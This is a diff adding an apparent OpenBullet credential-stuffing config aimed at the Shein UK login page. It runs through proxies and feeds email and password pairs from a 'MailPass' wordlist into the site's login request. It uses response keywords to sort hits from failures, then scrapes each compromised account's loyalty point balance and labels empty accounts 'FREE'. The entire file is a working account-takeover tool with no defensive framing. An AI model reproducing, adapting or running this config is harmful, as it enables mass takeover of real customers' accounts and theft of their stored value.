@@ -1,0 +1,64 @@
+[SETTINGS]
+{
+  "Name": "Shein UK",
+  "SuggestedBots": 10,
+  "LastModified": "2019-03-23T08:13:06.2588467+01:00",
+  "AdditionalInfo": "",
+  "Author": "Fairy#6869",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET REQUEST GET "https://www.shein.co.uk/user/auth/login" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#Login REQUEST POST "https://www.shein.co.uk/user/auth/login" AutoRedirect=TRUE 
+  CONTENT "email=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Referer: https://www.shein.co.uk/user/auth/login" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "DNT: 1" 
+  HEADER "Connection: keep-alive" 
+#Check KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "{\"code\":\"400504\",\"msg\":\"PasswordError\",\"info\":null}" 
+  KEYCHAIN Success OR 
+    KEY "member_info_id" 
+#GET_POINTS REQUEST GET "https://www.shein.co.uk/user/points" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "DNT: 1" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Connection: keep-alive" 
+#Point_Capture PARSE "<SOURCE>" LR "{\"total\":" "," Recursive=FALSE -> CAP "Points" "" "" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "{\"total\":0," 
